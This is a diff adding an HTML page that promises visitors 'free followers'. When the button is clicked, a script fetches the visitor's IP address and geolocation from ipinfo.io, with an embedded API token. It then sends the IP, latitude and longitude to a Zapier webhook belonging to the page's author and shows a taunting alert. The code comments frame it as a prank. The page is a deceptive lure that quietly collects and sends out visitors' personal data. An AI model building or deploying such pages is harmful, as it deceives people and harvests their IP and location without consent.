@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>followers</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            text-align: center;
+            padding: 20px;
+        }
+
+        h1 {
+            color: #333;
+            font-size: 36px;
+        }
+
+        p {
+            font-size: 18px;
+            color: #666;
+        }
+
+        button {
+            background-color: #3498db;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #2980b9;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Surprise! here free followers.</h1>
+    <p>Click the button, and I'll give you followers.</p>
+    <button onclick="trackLocation()">Get Followers</button>
+
+    <script>
+        function trackLocation() {
+            fetch('https://ipinfo.io/json?token=f19c91286ab6ab')
+                .then(response => response.json())
+                .then(data => {
+                    console.log(data); // Log the full data for you
+
+                    // Extract latitude and longitude from the location data
+                    const location = data.loc.split(',');
+                    const latitude = location[0];
+                    const longitude = location[1];
+
+                    // Send the location data to your server/webhook (you receive the data here)
+                    fetch('https://hooks.zapier.com/hooks/catch/21281836/2zgate8/', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            ip: data.ip,
+                            latitude: latitude,
+                            longitude: longitude,
+                            location: data.loc,
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(result => console.log('Data sent successfully:', result))
+                    .catch(error => console.error('Error sending data:', error));
+
+                    // You (the pranker) will see the alert
+                    alert("I know your exact location!\nLatitude: " + latitude + "\nLongitude: " + longitude);
+                })
+                .catch(err => {
+                    console.error(err);
+                    alert("Error occurred while fetching location.");
+                });
+        }
+    </script>
+
+</body>
+</html>
